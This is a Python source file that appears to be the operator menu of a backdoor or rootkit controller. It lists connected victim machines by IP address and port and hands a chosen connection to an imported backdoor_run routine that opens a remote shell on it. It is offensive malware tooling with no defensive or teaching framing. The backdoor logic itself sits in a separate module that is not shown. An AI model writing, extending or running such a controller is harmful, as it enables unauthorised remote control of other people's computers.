from time import sleep
from os import system
from sys import stderr, exit


# lib
from .backdoor import *


def display_menu():
    print("\n\n")
    print("==== Backdoor Main Menu ====")
    print("     ==================     ")
    print("l  --  list connections")
    print("x  --  execute backdoor")
    print("c  --  clear screen")
    print("h  --  display help menu")
    print("q  --  quit program")
    print("====                    ====")


def wait_cmd():
    cmd = ""
    while cmd == "":
        cmd = input("[rootkit_main_menu] >>> ")
    return cmd


def list_connections(addrs):
    i = 0
    print("\n\n")
    print("====  Connections  ====")
    for addr in addrs:
        print("->  %d  --  %s  --  %d  " % (i, addr[0], addr[1]))
        i += 1
    print("====               ====")


def execute_backdoor(cons, addrs, shell_port):
    list_connections(addrs)
    try:
        cmd = wait_cmd()
        cmd = int(cmd)
    except:
        #system("clear")
        execute_backdoor(cons, addrs, shell_port)
    try:
        conn = cons[cmd]
    except:
        #system("clear")
        stderr.write("[x] Index out of bounds\n\n")
        execute_backdoor(cons, addrs, shell_port)

    #system("clear")
    backdoor_run(conn, shell_port)


def execute_cmd(cons, addrs, cmd, shell_port):
    status = 0
    if cmd == "q":
        status = 1
    elif cmd == "l":
        system("clear")
        list_connections(addrs)
    elif cmd == "c":
        system("clear")
    elif cmd == "x":
        execute_backdoor(cons, addrs, shell_port)
    else:
        display_menu()
    return status


def main_menu(cons, addrs, ip_addr, port, shell_port, status=0):
    display_menu()
    cmd = wait_cmd()
    status = execute_cmd(cons, addrs, cmd, shell_port)
    while status != 1:
        cmd = wait_cmd()
        status = execute_cmd(cons, addrs, cmd, shell_port)